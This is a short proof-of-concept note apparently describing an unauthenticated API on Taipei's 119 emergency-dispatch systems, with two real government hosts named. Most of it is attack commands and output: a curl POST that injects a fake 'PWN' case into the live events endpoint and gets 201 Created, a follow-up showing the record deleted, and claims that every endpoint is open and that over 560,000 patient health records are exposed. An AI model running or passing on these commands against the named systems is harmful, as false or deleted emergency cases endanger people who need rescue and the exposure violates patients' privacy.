Taipei 119 Real-time Case Broadcast POC

Target
https://epcr.tpf.gov.tw:4001/events + https://tpertc.tfd.gov.tw:8787

NoAuth Broadcast
curl -X POST -H 'Content-Type: application/json' -d '{
  "CaseID":"TPE_119_BROADCAST",
  "TypeOfEventTxt":"PWN",
  "Annotation":"Real-time case sync test"
}' https://epcr.tpf.gov.tw:4001/events
→ HTTP 201 Created

curl https://epcr.tpf.gov.tw:4001/events/TPE_119_BROADCAST
→ HTTP 404 (after DELETE)

Impact
- Zero auth: POST/GET/DELETE all endpoints
- Real-time case injection to Taipei 119
- 560k+ PHI records exposed
